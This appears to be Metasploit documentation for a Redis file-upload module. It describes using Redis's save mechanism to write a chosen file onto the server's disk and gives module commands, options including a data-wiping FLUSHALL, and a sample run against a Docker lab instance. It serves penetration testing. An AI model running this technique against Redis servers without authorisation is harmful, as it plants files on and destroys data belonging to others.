## Description

Redis is an in-memory data structure project implementing a distributed, in-memory key-value database with optional durability. Redis supports different kinds of abstract data structures, such as strings, lists, maps, sets, sorted sets, HyperLogLogs, bitmaps, streams, and spatial indexes.

This module can be used to leverage functionality exposed by Redis to achieve somewhat arbitrary file upload to a file and directory to which the user account running the redis instance has access.  It is not totally arbitrary because the exact contents of the file cannot be completely controlled given the nature of how Redis stores its database on disk.

## Vulnerable Application

This module is tested on two different Redis server instances.
Virtual testing environments (inside docker container): 

 - Redis 5.0.6
 - Redis 4.0.14

## Verification Steps

  1. Do: `use auxiliary/scanner/redis/file_upload`
  2. Do: `set rhosts [ips]`
  3. Do: `set LocalFile [local_file_path_to_be_uploaded]`
  4. Do: `set RemoteFile [remote_file_destination]`
  5. Do: `run`

## Options

**FLUSHALL**

If set to `true`, redis server will remove all redis data before saving. Defaults to `false`.

**DISABLE_RDBCOMPRESSION**

If set to `false`, redis server will disable compression before saving. Defaults to `true`.

## Scenarios

### Redis:4.0.14 inside a docker container
  ```
msf5 auxiliary(scanner/redis/file_upload) > set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2
msf5 auxiliary(scanner/redis/file_upload) > set LocalFile redis_upload_test.txt
LocalFile => redis_upload_test.txt
msf5 auxiliary(scanner/redis/file_upload) > set RemoteFile redis_upload_test.txt
RemoteFile => redis_upload_test.txt
msf5 auxiliary(scanner/redis/file_upload) > run

[+] 172.17.0.2:6379       - 172.17.0.2:6379       -- saved 23 bytes inside of redis DB at redis_upload_test.txt
[*] 172.17.0.2:6379       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
  ```